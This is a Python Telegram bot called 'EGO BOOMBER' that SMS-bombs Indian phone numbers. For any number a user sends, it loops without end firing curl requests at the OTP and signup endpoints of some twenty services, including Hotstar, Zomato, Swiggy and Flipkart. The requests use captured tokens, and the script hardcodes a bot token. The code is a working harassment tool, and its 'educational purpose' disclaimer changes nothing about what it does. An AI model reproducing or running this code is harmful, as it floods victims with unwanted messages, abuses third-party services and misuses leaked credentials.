#!/usr/bin/env python
import sys, os
sys.stderr = open(os.devnull, 'w')
import random
import subprocess
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Bot Token - Apna token yahan daalein
BOT_TOKEN = "8865276403:AAGCxWFbGQeMbrikXNUu8h-DlFb9VuYbdFA"

# Colors
C_BOX    = "\033[1;35m"
C_TITLE  = "\033[1;37m"
C_LABEL  = "\033[1;36m"
C_VALUE  = "\033[1;32m"
C_WARN   = "\033[1;33m"
C_SIGN   = "\033[101m\033[1;37m"
C_RED    = "\033[1;31m"
RESET    = "\033[0m"

# Store active bombing sessions
active_bombs = {}

def clear():
    _ = subprocess.call('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print("\n    [ EGO ~ BOOMBER ]    \n")
    print(f"{C_BOX} ╔══════════════════════════════════════════╗{RESET}")
    print(f"{C_BOX} ║{C_TITLE}       •  @BESTCHEAT_OWNER ~ BOOMBER  •           {C_BOX}║{RESET}")
    print(f"{C_BOX} ╠══════════════════════════════════════════╣{RESET}")
    print(f"{C_BOX} ║                                          ║{RESET}")
    print(f"{C_BOX} ║ {C_LABEL} > User Access  : {C_VALUE}Administrator          {C_BOX}║{RESET}")
    print(f"{C_BOX} ║ {C_LABEL} > Connectivity : {C_VALUE}Secure (TLS)           {C_BOX}║{RESET}")
    print(f"{C_BOX} ║ {C_LABEL} > Latency      : {C_VALUE}24ms                   {C_BOX}║{RESET}")
    print(f"{C_BOX} ║                                          ║{RESET}")
    print(f"{C_BOX} ╚══════════════════════════════════════════╝{RESET}")
    print("")
    print(f"{C_WARN}  [!] System synchronized with remote host.{RESET}")
    print(f"{C_WARN}  [!] Encrypted logs saved to local disk.{RESET}")
    print(f"{C_WARN}  [!] Waiting for command input...{RESET}")
    print("")

def infinite(target, color, chat_id):
    times = 0
    while chat_id in active_bombs and active_bombs[chat_id]:
        try:
            print(color + "[*] Bombing.FUXK.. " + target + RESET)
            
            # Hotstar
            subprocess.Popen(
                f'''curl -X PUT -H "Host:api.hotstar.com" -H "content-length:51" -H "x-hs-usertoken:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "x-hs-platform:PCTV" -H "x-country-code:IN" -H "x-hs-device-id:faa88f05-7432-4103-9886-7bd934f5c3a1" -H "hotstarauth:st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d" -H "x-hs-appversion:5.0.40" -H "x-request-id:faa88f05-7432-4103-9886-7bd934f5c3a1" -H "accept:*/*" -H "origin:https://www.hotstar.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.hotstar.com/in/subscribe/sign-in" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{{"phone_number":"{target}","country_prefix":"91"}}' "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # AltBalaji
            subprocess.Popen(
                f'''curl -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:86" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "X-API-KEY:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE" -H "Content-Type:application/json" -H "Origin:https://www.altbalaji.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.altbalaji.com/user-detail?pid=NTU%3D" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{{"phone_number":"{target}","country_code":"91","platform":"web","exp":1601043289127}}' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Voot
            subprocess.Popen(
                f'''curl -X POST -H "Host:us-central1-vootdev.cloudfunctions.net" -H "content-length:59" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "origin:https://www.voot.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.voot.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{{"type":"mobile","mobile":"{target}","countryCode":"+91"}}' "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # SonyLiv
            subprocess.Popen(
                f'''curl -X POST -H "Host:apiv2.sonyliv.com" -H "content-length:111" -H "device_id:5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120" -H "security_token:eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "session_id:cc86326a51504133bacd3ce4f796e1cf-1600956156256" -H "x-via-device:true" -H "app_version:3.1.20" -H "origin:https://www.sonyliv.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{{"channelPartnerID":"MSMIND","mobileNumber":"{target}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}}' "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # MedPlus
            subprocess.Popen(
                f'''curl -X POST -H "Host:mobile.medplusindia.com" -H "content-length:238" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://www.medplusmart.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={target}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false' "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl" --output Logfile > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Apollo247
            subprocess.Popen(
                f'''curl -X POST -H "Host:webapi.apollo247.com" -H "Connection:keep-alive" -H "Content-Length:292" -H "accept:*/*" -H "Authorization:Bearer 3d1833da7020e0602165529446587434" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "Origin:https://www.apollo247.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{{"operationName":"Login","variables":{{"mobileNumber":"+91{target}","loginType":"PATIENT"}},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {{\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {{\\nstatus\\nmessage\\nloginId\\n__typename\\n  }}\\n}}\\n"}}' "https://webapi.apollo247.com/" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Netmeds
            subprocess.Popen(
                f'''curl -X GET -H "Host:m.netmeds.com" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.netmeds.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" "https://m.netmeds.com/mst/rest/v1/id/details/{target}" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # GetInstaCash
            subprocess.Popen(
                f'''curl -X POST -H "Host:getinstacash.in" -H "Connection:keep-alive" -H "Content-Length:30" -H "Accept:*/*" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://getinstacash.in" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://getinstacash.in/sell/login" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d "type=sendOTP&mobile={target}" "https://getinstacash.in/sell/getData.php" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # FBB Online
            subprocess.Popen(
                f'''curl -X POST -H "Host:www.fbbonline.in" -H "content-length:432" -H "accept:application/json, text/javascript, */*; q=0.01" -H "x-newrelic-id:VQ8PVlFUChABV1ZRBgYCX1w=" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.fbbonline.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.fbbonline.in/customer/account/create" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={target}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' "https://www.fbbonline.in/customer/account/GenerateOtp" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Grofers
            subprocess.Popen(
                f'''curl -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "device_id:a11f656b-422e-4617-953b-c350d517467d" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "auth_key:57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13" -H "app_client:consumer_web" -H "lat:28.4465616" -H "content-type:application/x-www-form-urlencoded" -H "save-data:on" -H "accept:*/*" -H "origin:https://grofers.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'user_phone={target}' "https://grofers.com/v2/accounts/" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Snapdeal
            subprocess.Popen(
                f'''curl -X POST -H "Host:m.snapdeal.com" -H "content-length:135" -H "xc:eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19" -H "h2:true" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "xg:eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "u:160081122259159083" -H "save-data:on" -H "us:" -H "accept:*/*" -H "origin:https://m.snapdeal.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.snapdeal.com/signin" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy' "https://m.snapdeal.com/signupCompleteAjax" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Zomato
            subprocess.Popen(
                f'''curl -X POST -H "Host:www.zomato.com" -H "content-length:80" -H "x-zomato-csrft:a6b0c09972b2bdd30c9c1b6552caee5d" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://www.zomato.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.zomato.com/kanpur" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{{"country_id":1,"phone":"{target}","verification_type":"sms","method":"phone"}}' "https://www.zomato.com/webroutes/auth/login" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Rest of the APIs - shortened for Telegram
            subprocess.Popen(
                f'''curl -X POST -H "Host:www.cuemath.com" -H "content-length:235" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/JSON" -H "accept:*/*" -H "origin:https://www.cuemath.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad" -d '{{"intl_mobile":{{"phone":""}},"phone":"{target}","email":"nsbd@dn.djs","full_name":"hdhdhdg","place_id":"ChIJYYhT3gl3AjoRUDlkL1i5oIk","timezone":"Asia/Calcutta","detail_source":"CMO_2020","form_fields":"full_name,phone,email,place_id"}}' "https://www.cuemath.com/api/v4/parents/" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Dream11
            subprocess.Popen(
                f'''curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?ru=" -d '{{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) {{ registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) {{ message }} }}","variables":{{"email":"tsunami@gmail.com","mobileNumber":"{target}","password":"tsunami@123astronomia"}}}}' "https://www.dream11.com/graphql/mutation/pwa/register" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Flipkart
            subprocess.Popen(
                f'''curl -X POST -H "Host:1.rome.api.flipkart.com" -H "content-length:338" -H "x-user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT" -d '{{"actionRequestContext":{{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{target}","clientQueryParamMap":{{"ret":"/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135","entryPage":"HOMEPAGE_HEADER_ACCOUNT"}},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}}}' "https://1.rome.api.flipkart.com/1/action/view" --output Logfile > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Oyo Rooms
            subprocess.Popen(
                f'''curl -X POST -H "Host:www.oyorooms.com" -H "content-length:51" -H "xsrf-token:vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:text/plain;charset=UTF-8" -H "accept:*/*" -H "origin:https://www.oyorooms.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.oyorooms.com/login" -d '{{"phone":"{target}","country_code":"+91","nod":4}}' "https://www.oyorooms.com/api/pwa/generateotp?locale=en" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # BookMyShow
            subprocess.Popen(
                f'''curl -X POST -H "Host:in.bookmyshow.com" -H "content-length:108" -H "accept:application/json" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://in.bookmyshow.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={target}&email=&source=web" -d '{{"channel":"phone","subChannel":"sms","details":{{"phone":"{target}","origin":"https://in.bookmyshow.com"}}}}' "https://in.bookmyshow.com/pwa/api/uapi/otp/send" > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

            # Swiggy
            subprocess.Popen(
                f'''curl -X POST -H "Host:www.swiggy.com" -H "content-length:172" -H "origin:https://www.swiggy.com" -H "__fetch_req__:true" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.swiggy.com/auth/register" -d '{{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{target}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}}' "https://www.swiggy.com/mapi/auth/signup" --output Logfile > /dev/null 2>&1''', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            times += 1

        except KeyboardInterrupt:
            raise
        except Exception:
            pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")],
        [InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bomb")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔥 Welcome {user.first_name}!\n\n"
        f"💣 EGO BOOMBER Bot\n"
        f"👤 @BESTCHEAT_OWNER\n\n"
        f"Send me a phone number to start bombing!\n"
        f"Example: 9876543210\n\n"
        f"⚠️ For Educational Purpose Only",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    target = update.message.text.strip()
    
    # Validate phone number
    if not target.isdigit() or len(target) != 10:
        await update.message.reply_text("❌ Please enter a valid 10-digit phone number!\nExample: 9876543210")
        return
    
    # Check if already bombing
    if chat_id in active_bombs and active_bombs[chat_id]:
        await update.message.reply_text("⚠️ Already bombing! Use /stop to stop first.")
        return
    
    # Start bombing
    active_bombs[chat_id] = True
    colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
    color = random.choice(colors)
    
    await update.message.reply_text(
        f"✅ Started bombing +91{target}\n"
        f"📱 Target: {target}\n"
        f"💣 Status: ACTIVE\n"
        f"🔄 Sending OTPs...\n\n"
        f"Use /stop to stop bombing"
    )
    
    # Run bombing in background
    try:
        infinite(target, color, chat_id)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        if chat_id in active_bombs:
            active_bombs[chat_id] = False
            await update.message.reply_text(
                f"🛑 Stopped bombing +91{target}\n"
                f"Total requests sent successfully!"
            )

async def stop_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in active_bombs and active_bombs[chat_id]:
        active_bombs[chat_id] = False
        await update.message.reply_text("🛑 Bombing stopped successfully!")
    else:
        await update.message.reply_text("ℹ️ No active bombing session found.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in active_bombs and active_bombs[chat_id]:
        await update.message.reply_text("🟢 Status: ACTIVE\n💣 Bombing is running...")
    else:
        await update.message.reply_text("🔴 Status: IDLE\n💣 No active bombing session.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 EGO BOOMBER Bot Commands:\n\n"
        "/start - Start the bot\n"
        "/stop - Stop bombing\n"
        "/status - Check bombing status\n"
        "/help - Show this help\n\n"
        "💡 Just send a 10-digit phone number to start!\n\n"
        "⚠️ For Educational Purpose Only\n"
        "👤 @BESTCHEAT_OWNER"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "start_bomb":
        await query.edit_message_text(
            "📱 Send me a 10-digit phone number to start bombing!\n"
            "Example: 9876543210\n\n"
            "🚀 Ready to bomb!"
        )
    elif query.data == "stop_bomb":
        chat_id = update.effective_chat.id
        if chat_id in active_bombs and active_bombs[chat_id]:
            active_bombs[chat_id] = False
            await query.edit_message_text("🛑 Bombing stopped successfully!")
        else:
            await query.edit_message_text("ℹ️ No active bombing session found.")
    elif query.data == "status":
        chat_id = update.effective_chat.id
        if chat_id in active_bombs and active_bombs[chat_id]:
            await query.edit_message_text("🟢 Status: ACTIVE\n💣 Bombing is running...")
        else:
            await query.edit_message_text("🔴 Status: IDLE\n💣 No active bombing session.")
    elif query.data == "help":
        await query.edit_message_text(
            "🤖 EGO BOOMBER Bot Commands:\n\n"
            "/start - Start the bot\n"
            "/stop - Stop bombing\n"
            "/status - Check bombing status\n"
